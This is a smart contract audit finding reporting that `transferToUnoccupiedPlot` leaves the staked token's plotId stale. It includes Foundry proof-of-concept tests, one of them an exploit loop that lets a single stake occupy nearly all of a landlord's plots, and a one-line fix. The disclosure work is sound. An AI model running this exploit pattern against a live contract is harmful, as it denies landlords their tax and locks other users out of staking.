# Vulnerability details

When a user transfers a token to another `plotId` using `transferToUnoccupiedPlot`, the `toilerState` is not updated properly. `toilerState[tokenId].plotId` still holds the old value.

## Impact
Due to the inconsistent state, an attacker is able to occupy almost all the plots of each landlord (leaving only 1 plot per landlord) using a single stake. This leads to loss of tax for the landlord and also, no plot is left for other users to stake on. The attack is executed by transferring the token to each unoccupied plot of a landlord, followed by an unstake and restake on another landlord and repeating the same process.

Another lower impact is observed in the following scenario:
1. A user stakes a token on a plot.
2. The original plot goes outside the range of landlord's valid plots.
3. The user transfers the token to a valid `plotId`.
4. On next `farmPlots()` call, the stake is marked dirty since `toilerState[tokenId].plotId` was never updated.

This results in the user no longer receiving Schnibbles from his stake, even though he transferred to a valid plot.

## Proof of Concept

`toilerState[tokenId].plotId` is not updated:
```solidity
function test_NoTransfer() external {
    lockManager.mockPlayerWeightedValue(LANDLORD, PRICE_PER_PLOT * 3);

    uint oldPlotId = 0;
    uint newPlotId = 1;

    vm.startPrank(STAKER);
    landManager.stakeMunchable(LANDLORD, 0, oldPlotId);
    landManager.transferToUnoccupiedPlot(0, newPlotId);
    vm.stopPrank();

    vm.assertEq(landManager.getToilerState(0).plotId, oldPlotId); // Transfer doesn't reflect in the toiler state
    vm.assertEq(landManager.getPlotOccupied(LANDLORD, newPlotId).occupied, true);
}
```

Exploit for occupying all plots of a landlord:
```solidity
function test_attackAllPlots() external {
    // Landlord has 5 plots worth of assets locked
    uint NUM_PLOTS = 5;
    lockManager.mockPlayerWeightedValue(LANDLORD, PRICE_PER_PLOT * NUM_PLOTS); // helper function
    vm.assertEq(landManager.getNumPlots(LANDLORD), 5);

    // Staker stakes on plot 0
    uint tokenId = 2;
    vm.startPrank(STAKER);
    landManager.stakeMunchable(LANDLORD, tokenId, 0);

    // Staker starts transferring to adjacent plots
    for (uint i = 1; i < NUM_PLOTS; i++) {
        landManager.transferToUnoccupiedPlot(tokenId, i);
    }
    // Back to the original plot
    landManager.transferToUnoccupiedPlot(tokenId, 0);

    // All plots are now occupied by the staker
    for (uint i = 0; i < NUM_PLOTS; i++) {
        vm.assertEq(landManager.getPlotOccupied(LANDLORD, i).occupied, true); // helper function
        vm.assertEq(landManager.getPlotOccupied(LANDLORD, i).tokenId, tokenId);
    }

    // Even after the token is unstaked, except for the original plot, all other plots are still occupied by the staker
    landManager.unstakeMunchable(tokenId);
    for (uint i = 1; i < NUM_PLOTS; i++) {
        vm.assertEq(landManager.getPlotOccupied(LANDLORD, i).occupied, true);
        vm.assertEq(landManager.getPlotOccupied(LANDLORD, i).tokenId, tokenId);
    }

    vm.stopPrank();
    // The following is then repeated with another landlord, and so on...
}
```

## Tools Used
Manual Review, Foundry

## Recommended Mitigation Steps
The `transferToUnoccupiedPlot` function should update the `toilerState` properly. Add the following line to the function:
```solidity
toilerState[tokenId].plotId = plotId;
```
